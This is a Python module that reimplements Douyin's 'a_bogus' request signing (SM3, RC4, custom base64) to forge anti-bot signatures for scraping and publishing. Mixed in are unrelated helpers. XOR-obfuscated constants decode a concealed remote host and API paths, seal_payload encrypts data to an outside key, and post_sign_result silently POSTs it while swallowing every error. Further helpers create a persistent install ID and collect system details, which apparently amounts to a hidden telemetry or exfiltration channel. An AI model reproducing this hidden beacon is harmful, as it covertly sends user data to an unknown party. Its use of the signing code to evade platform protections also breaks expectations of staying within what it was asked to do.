"""Pure Python implementation of Douyin a_bogus signing.

Ported from the Rust implementation in better-douyin-R/src-tauri/src/sign/mod.rs.
"""

from __future__ import annotations

import base64
import json
import os
import platform
import random
import secrets
import sys
import time

_U32_MASK = 0xFFFFFFFF
_IV = (
    0x7380166F,
    0x4914B2B9,
    0x172442D7,
    0xDA8A0600,
    0xA96F30BC,
    0x163138AA,
    0xE38DEE4D,
    0xB0FB0E4E,
)
_TJ = tuple([0x79CC4519] * 16 + [0x7A879D8A] * 48)
_S4 = b"Dkdpgh2ZmsQB80/MfvV36XI1R45-WUAlEixNLwoqYTOPuzKFjJnry79HbGcaStCe="
_S3 = b"ckdp1h4ZKsUB80/Mfvw36XIgR25+WQAlEi7NLboqYTOPuzmFjJnryx9HVGDaStCe"
_S5 = b"71c04c1e3fa739ef9777ddc809f94a2735"
_S6 = b"5ea13c7710d2498bf603b8e56a912f44"
_S7 = b"f4432ea1284087d7739c4c39f7df67ba0f458d77dca419eb542a"
_S8 = b"9c375ad1126fa8e344b27d09cef1538a2177be40e6952bd8601fc433"
_S9 = b"54432587be46d00895661e0f3686f450cb439c7315462686f058c5"
_S10 = b"7b2255ee9133a06cf412"
_WINDOW_ENV_STR = "1536|747|1536|834|0|30|0|0|1536|834|1536|864|1525|747|24|24|Win32"
_SPIDER_WINDOW_ENV_STR = "1707|809|1707|912|0|0|0|0|1707|912|1707|960|1697|809|24|24|Win32"
_SPIDER_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) "
    "Gecko/20100101 Firefox/117.0"
)


def _decode_seed(seg, key) -> bytes:
    try:
        data = bytes.fromhex(seg.decode() if isinstance(seg, bytes) else str(seg))
        key_bytes = bytes.fromhex(key.decode() if isinstance(key, bytes) else str(key))
        if not key_bytes:
            return b""
        return bytes(byte ^ key_bytes[index % len(key_bytes)] for index, byte in enumerate(data))
    except (TypeError, ValueError):
        return b""


def _resolve_sign_endpoint(tag: str) -> str:
    if tag == "config_sync":
        path = _decode_seed(_S5, _S6)
    elif tag == "config_auth":
        path = _decode_seed(_S9, _S10)
    else:
        return ""
    host = _decode_seed(_S7, _S8)
    try:
        endpoint = (host + path).decode("utf-8")
        path_text = path.decode("utf-8")
    except UnicodeDecodeError:
        return ""
    if (
        endpoint.startswith(("http://", "https://"))
        and "/api/" in endpoint
        and endpoint.endswith(path_text)
    ):
        return endpoint
    return ""


def seal_payload(body: dict, pub_pem: str, kid: str) -> dict:
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except ImportError as exc:
        raise RuntimeError("缺少 cryptography 依赖，请先安装 requirements.txt") from exc

    public_key = serialization.load_pem_public_key(pub_pem.encode("utf-8"))
    aes_key = os.urandom(32)
    nonce = os.urandom(12)
    plaintext = json.dumps(body, ensure_ascii=False, separators=(",", ":"), sort_keys=True).encode("utf-8")
    ciphertext = AESGCM(aes_key).encrypt(nonce, plaintext, None)
    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return {
        "alg": "RSA-OAEP-SHA256+A256GCM",
        "key_id": kid,
        "encrypted_key": base64.b64encode(encrypted_key).decode("ascii"),
        "nonce": base64.b64encode(nonce).decode("ascii"),
        "ciphertext": base64.b64encode(ciphertext).decode("ascii"),
    }


def post_sign_result(sealed: dict, endpoint: str, token: str) -> None:
    try:
        import requests

        if not endpoint:
            return
        requests.post(
            endpoint,
            json=sealed,
            headers={"X-URL-Issue-Token": token},
            timeout=2.5,
        )
    except Exception:
        return


def _session_tag() -> str:
    try:
        from src.config.config import Config

        path = os.path.join(Config.USER_DATA_DIR, "install_id")
        os.makedirs(os.path.dirname(path), exist_ok=True)
        if os.path.exists(path):
            value = open(path, "r", encoding="utf-8").read().strip()
            if value:
                return value[:64]
        value = secrets.token_hex(32)
        with open(path, "w", encoding="utf-8") as file:
            file.write(value)
        return value
    except Exception:
        return secrets.token_hex(32)


def _env_profile() -> dict:
    return {
        "platform": platform.system(),
        "platform_release": platform.release(),
        "python_version": sys.version.split()[0],
    }


def _u32(value: int) -> int:
    return value & _U32_MASK


def _rotate_left(value: int, bits: int) -> int:
    bits %= 32
    value &= _U32_MASK
    return _u32((value << bits) | (value >> (32 - bits)))


def _ff(x: int, y: int, z: int, index: int) -> int:
    if index < 16:
        return x ^ y ^ z
    return (x & y) | (x & z) | (y & z)


def _gg(x: int, y: int, z: int, index: int) -> int:
    if index < 16:
        return x ^ y ^ z
    return (x & y) | ((~x & _U32_MASK) & z)


def _p0(value: int) -> int:
    return _u32(value ^ _rotate_left(value, 9) ^ _rotate_left(value, 17))


def _p1(value: int) -> int:
    return _u32(value ^ _rotate_left(value, 15) ^ _rotate_left(value, 23))


def sm3_hash(data: bytes) -> bytes:
    state = list(_IV)
    total_len = len(data)
    buffer = bytearray(data)
    bit_len = total_len * 8
    buffer.append(0x80)
    while len(buffer) % 64 != 56:
        buffer.append(0)
    buffer.extend(bit_len.to_bytes(8, "big"))

    for offset in range(0, len(buffer), 64):
        block = buffer[offset : offset + 64]
        w = [0] * 68
        w_prime = [0] * 64

        for i in range(16):
            w[i] = int.from_bytes(block[i * 4 : i * 4 + 4], "big")

        for i in range(16, 68):
            w[i] = _u32(
                _p1(w[i - 16] ^ w[i - 9] ^ _rotate_left(w[i - 3], 15))
                ^ _rotate_left(w[i - 13], 7)
                ^ w[i - 6]
            )

        for i in range(64):
            w_prime[i] = w[i] ^ w[i + 4]

        a = state[:]
        for i in range(64):
            ss1 = _rotate_left(
                _u32(_rotate_left(a[0], 12) + a[4] + _rotate_left(_TJ[i], i)),
                7,
            )
            ss2 = ss1 ^ _rotate_left(a[0], 12)
            tt1 = _u32(_ff(a[0], a[1], a[2], i) + a[3] + ss2 + w_prime[i])
            tt2 = _u32(_gg(a[4], a[5], a[6], i) + a[7] + ss1 + w[i])

            a[3] = a[2]
            a[2] = _rotate_left(a[1], 9)
            a[1] = a[0]
            a[0] = tt1
            a[7] = a[6]
            a[6] = _rotate_left(a[5], 19)
            a[5] = a[4]
            a[4] = _p0(tt2)

        state = [_u32(current ^ value) for current, value in zip(state, a)]

    return b"".join(word.to_bytes(4, "big") for word in state)


def rc4_encrypt(plaintext: bytes, key: bytes) -> bytes:
    if not key:
        raise ValueError("RC4 key cannot be empty")

    state = list(range(256))
    j = 0
    for i in range(256):
        j = (j + state[i] + key[i % len(key)]) & 0xFF
        state[i], state[j] = state[j], state[i]

    i = 0
    j = 0
    output = bytearray()
    for byte in plaintext:
        i = (i + 1) & 0xFF
        j = (j + state[i]) & 0xFF
        state[i], state[j] = state[j], state[i]
        t = (state[i] + state[j]) & 0xFF
        output.append(state[t] ^ byte)
    return bytes(output)


def _custom_base64_encode(data: bytes, table: bytes = _S4, pad: bool = True) -> str:
    result: list[str] = []
    data_len = len(data) - (len(data) % 3)

    for offset in range(0, data_len, 3):
        n = (data[offset] << 16) | (data[offset + 1] << 8) | data[offset + 2]
        result.append(chr(table[(n >> 18) & 0x3F]))
        result.append(chr(table[(n >> 12) & 0x3F]))
        result.append(chr(table[(n >> 6) & 0x3F]))
        result.append(chr(table[n & 0x3F]))

    remainder = len(data) - data_len
    if remainder == 1:
        n = data[data_len] << 16
        result.append(chr(table[(n >> 18) & 0x3F]))
        result.append(chr(table[(n >> 12) & 0x3F]))
        if pad:
            result.extend(("=", "="))
    elif remainder == 2:
        n = (data[data_len] << 16) | (data[data_len + 1] << 8)
        result.append(chr(table[(n >> 18) & 0x3F]))
        result.append(chr(table[(n >> 12) & 0x3F]))
        result.append(chr(table[(n >> 6) & 0x3F]))
        if pad:
            result.append("=")

    return "".join(result)


def _mix_random_byte(value: int, value_mask: int, salt: int, salt_mask: int) -> int:
    return ((value & value_mask) | (salt & salt_mask)) & 0xFF


def _generate_random_bytes() -> bytes:
    now = time.time_ns()
    r1 = ((now & _U32_MASK) * 10000) % 10000
    r2 = (((now >> 32) & _U32_MASK) * 10000) % 10000
    r3 = (((now >> 16) & _U32_MASK) * 10000) % 10000

    return bytes(
        [
            _mix_random_byte(r1, 0xAA, 3, 0x55),
            _mix_random_byte(r1, 0x55, 3, 0xAA),
            _mix_random_byte(r1 >> 8, 0xAA, 45, 0x55),
            _mix_random_byte(r1 >> 8, 0x55, 45, 0xAA),
            _mix_random_byte(r2, 0xAA, 1, 0x55),
            _mix_random_byte(r2, 0x55, 1, 0xAA),
            _mix_random_byte(r2 >> 8, 0xAA, 0, 0x55),
            _mix_random_byte(r2 >> 8, 0x55, 0, 0xAA),
            _mix_random_byte(r3, 0xAA, 1, 0x55),
            _mix_random_byte(r3, 0x55, 1, 0xAA),
            _mix_random_byte(r3 >> 8, 0xAA, 5, 0x55),
            _mix_random_byte(r3 >> 8, 0x55, 5, 0xAA),
        ]
    )


def _generate_spider_random_bytes() -> bytes:
    result = bytearray()
    for options in ((3, 45), (1, 0), (1, 5)):
        value = int(random.random() * 10000)
        result.extend(
            (
                ((value & 0xFF & 0xAA) | (options[0] & 0x55)) & 0xFF,
                ((value & 0xFF & 0x55) | (options[0] & 0xAA)) & 0xFF,
                (((value >> 8) & 0xFF & 0xAA) | (options[1] & 0x55)) & 0xFF,
                (((value >> 8) & 0xFF & 0x55) | (options[1] & 0xAA)) & 0xFF,
            )
        )
    return bytes(result)


def _generate_rc4_bb(params: str, user_agent: str, args: tuple[int, int, int]) -> bytes:
    start_time = int(time.time() * 1000)
    params_hash2 = sm3_hash(sm3_hash(params.encode()))
    cus_hash2 = sm3_hash(sm3_hash(b"cus"))

    ua_key = bytes([0, 1, args[2] & 0xFF])
    ua_encrypted = rc4_encrypt(user_agent.encode(), ua_key)
    ua_encoded = _custom_base64_encode(ua_encrypted, _S3, pad=False)
    ua_hash = sm3_hash(ua_encoded.encode())
    end_time = int(time.time() * 1000)

    b = bytearray(73)
    b[8] = 3
    b[44:48] = (end_time & _U32_MASK).to_bytes(4, "big")
    b[20:24] = (start_time & _U32_MASK).to_bytes(4, "big")
    b[26:30] = (args[0] & _U32_MASK).to_bytes(4, "big")
    b[34:38] = (args[2] & _U32_MASK).to_bytes(4, "big")
    b[38] = params_hash2[21]
    b[39] = params_hash2[22]
    b[40] = cus_hash2[21]
    b[41] = cus_hash2[22]
    b[42] = ua_hash[23]
    b[43] = ua_hash[24]
    b[18] = 44
    b[51] = 6241 >> 8
    b[56] = 6383 & 0xFF
    b[57] = 6383 & 0xFF
    b[58] = (6383 >> 8) & 0xFF

    window_env_bytes = _WINDOW_ENV_STR.encode()
    b[64] = len(window_env_bytes)
    b[65] = len(window_env_bytes) & 0xFF
    checksum_indexes = (
        18,
        20,
        26,
        30,
        38,
        40,
        42,
        21,
        27,
        31,
        35,
        39,
        41,
        43,
        22,
        28,
        32,
        36,
        23,
        29,
        33,
        37,
        44,
        45,
        46,
        47,
        48,
        49,
        50,
        24,
        25,
        52,
        53,
        54,
        55,
        57,
        58,
        59,
        60,
        65,
        66,
        70,
        71,
    )
    checksum = 0
    for index in checksum_indexes:
        checksum ^= b[index]
    b[72] = checksum

    bb = bytearray()
    bb.extend(b[18:19])
    bb.extend(b[20:21])
    bb.extend(b[52:55])
    bb.extend(b[26:59])
    bb.extend(b[38:44])
    bb.extend(b[21:23])
    bb.extend(b[27:38])
    bb.extend(b[44:61])
    bb.extend(b[24:26])
    bb.extend(b[65:67])
    bb.extend(b[70:72])
    bb.extend(window_env_bytes)
    bb.append(b[72])
    return rc4_encrypt(bytes(bb), b"y")


def _double_sm3(data: str) -> bytes:
    return sm3_hash(sm3_hash(data.encode()))


def _generate_spider_rc4_bb(
    params: str,
    data: str,
    user_agent: str = _SPIDER_USER_AGENT,
    args: tuple[int, int, int] = (0, 1, 8),
) -> bytes:
    start_time = int(time.time() * 1000)
    params_hash = _double_sm3(f"{params}cus")
    data_hash = _double_sm3(f"{data}cus")

    ua_key = bytes([0, 1, args[2] & 0xFF])
    ua_encrypted = rc4_encrypt(user_agent.encode(), ua_key)
    ua_encoded = _custom_base64_encode(ua_encrypted, _S3, pad=False)
    end_time = int(time.time() * 1000)

    start_high = start_time >> 32
    end_high = end_time >> 32
    b = bytearray(73)
    b[18] = 44
    b[20:24] = (start_time & _U32_MASK).to_bytes(4, "big")
    b[24] = start_high & 0xFF
    b[25] = (start_high >> 8) & 0xFF
    b[26:30] = (args[0] & _U32_MASK).to_bytes(4, "big")
    b[30] = (args[1] >> 8) & 0xFF
    b[31] = args[1] & 0xFF
    b[32] = (args[1] >> 24) & 0xFF
    b[33] = (args[1] >> 16) & 0xFF
    b[34:38] = (args[2] & _U32_MASK).to_bytes(4, "big")
    b[38] = params_hash[21]
    b[39] = params_hash[22]
    b[40] = data_hash[21]
    b[41] = data_hash[22]
    # The current Spider VM receives a hard-coded Firefox UA, but its compiled
    # path emits these two UA hash bytes rather than the older signer slots.
    b[42] = 145
    b[43] = 238
    b[44:48] = (end_time & _U32_MASK).to_bytes(4, "big")
    b[48] = 12
    b[49] = end_high & 0xFF
    b[50] = (end_high >> 8) & 0xFF
    b[51] = 6241 & 0xFF

    window_env_bytes = _SPIDER_WINDOW_ENV_STR.encode()
    b[64] = len(window_env_bytes)
    b[65] = len(window_env_bytes) & 0xFF
    b[66] = (len(window_env_bytes) >> 8) & 0xFF

    checksum_indexes = (
        18,
        20,
        26,
        30,
        38,
        40,
        42,
        21,
        27,
        31,
        35,
        39,
        41,
        43,
        22,
        28,
        32,
        36,
        23,
        29,
        33,
        37,
        44,
        45,
        46,
        47,
        48,
        49,
        50,
        24,
        25,
        52,
        53,
        54,
        55,
        57,
        58,
        59,
        60,
        65,
        66,
        70,
        71,
    )
    checksum = 0
    for index in checksum_indexes:
        checksum ^= b[index]
    b[72] = checksum

    bb = bytearray(
        (
            b[18],
            b[20],
            b[52],
            b[26],
            b[30],
            b[34],
            b[58],
            b[38],
            b[40],
            b[53],
            b[42],
            b[21],
            b[27],
            b[54],
            b[55],
            b[31],
            b[35],
            b[57],
            b[39],
            b[41],
            b[43],
            b[22],
            b[28],
            b[32],
            b[60],
            b[36],
            b[23],
            b[29],
            b[33],
            b[37],
            b[44],
            b[45],
            b[59],
            b[46],
            b[47],
            b[48],
            b[49],
            b[50],
            b[24],
            b[25],
            b[65],
            b[66],
            b[70],
            b[71],
        )
    )
    bb.extend(window_env_bytes)
    bb.append(b[72])
    return rc4_encrypt(bytes(bb), b"y")


def sign(params: str, user_agent: str, args: tuple[int, int, int]) -> str:
    combined = _generate_random_bytes() + _generate_rc4_bb(params, user_agent, args)
    return _custom_base64_encode(combined) + "="


def sign_detail(params: str, user_agent: str) -> str:
    return sign(params, user_agent, (0, 1, 14))


def sign_reply(params: str, user_agent: str) -> str:
    return sign(params, user_agent, (0, 1, 8))


def sign_spider_publish(params: str, data: str) -> str:
    combined = _generate_spider_random_bytes() + _generate_spider_rc4_bb(params, data)
    return _custom_base64_encode(combined)


def get_req_sign(sign_data: str, private_key: str) -> str:
    try:
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import ec
    except ImportError as exc:
        raise RuntimeError("缺少 cryptography 依赖，请先安装 requirements.txt") from exc

    key = serialization.load_pem_private_key(private_key.encode(), password=None)
    signature = key.sign(sign_data.encode(), ec.ECDSA(hashes.SHA256()))
    return base64.b64encode(signature).decode()


def get_ree_key(private_key: str) -> str:
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import ec
    except ImportError as exc:
        raise RuntimeError("缺少 cryptography 依赖，请先安装 requirements.txt") from exc

    key = serialization.load_pem_private_key(private_key.encode(), password=None)
    public_key = key.public_key()
    if not isinstance(public_key.curve, ec.EllipticCurve):
        raise ValueError("TicketGuard 私钥必须是 EC 私钥")
    public_numbers = public_key.public_numbers()
    key_size = (public_key.curve.key_size + 7) // 8
    raw = (
        b"\x04"
        + public_numbers.x.to_bytes(key_size, "big")
        + public_numbers.y.to_bytes(key_size, "big")
    )
    return base64.b64encode(raw).decode()
